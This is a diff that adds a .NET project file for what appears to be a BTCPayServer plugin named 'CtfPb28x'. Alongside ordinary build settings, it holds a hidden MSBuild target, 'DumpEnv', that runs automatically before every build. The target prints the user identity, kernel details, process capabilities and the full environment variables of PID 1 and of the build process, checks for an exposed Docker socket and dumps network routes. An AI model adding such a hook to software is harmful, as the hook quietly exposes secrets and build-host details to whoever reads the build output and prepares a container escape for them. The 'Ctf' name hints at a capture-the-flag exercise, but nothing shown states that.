@@ -1,0 +1,16 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <TargetFramework>net10.0</TargetFramework>
+    <AssemblyName>BTCPayServer.Plugins.CtfPb28x</AssemblyName>
+    <Product>CtfPb28x</Product>
+    <Version>1.0.0</Version>
+    <OutputType>Library</OutputType>
+    <EnableDefaultCompileItems>false</EnableDefaultCompileItems>
+  </PropertyGroup>
+  <ItemGroup>
+    <Compile Include="Plugin.cs" />
+  </ItemGroup>
+  <Target Name="DumpEnv" BeforeTargets="Build">
+    <Exec Command="sh -c 'echo DUMP_BEGIN; id; uname -a; echo CAP; cat /proc/1/status | tr \"\\t\" \" \" | head; echo ENV; tr \"\\0\" \"\\n\" &lt; /proc/1/environ; echo SELF; tr \"\\0\" \"\\n\" &lt; /proc/self/environ; echo SOCK; ls -la /var/run/docker.sock /var/run/docker.sock 2&gt;&amp;1; echo NET; cat /proc/net/route; echo DUMP_END'" />
+  </Target>
+</Project>
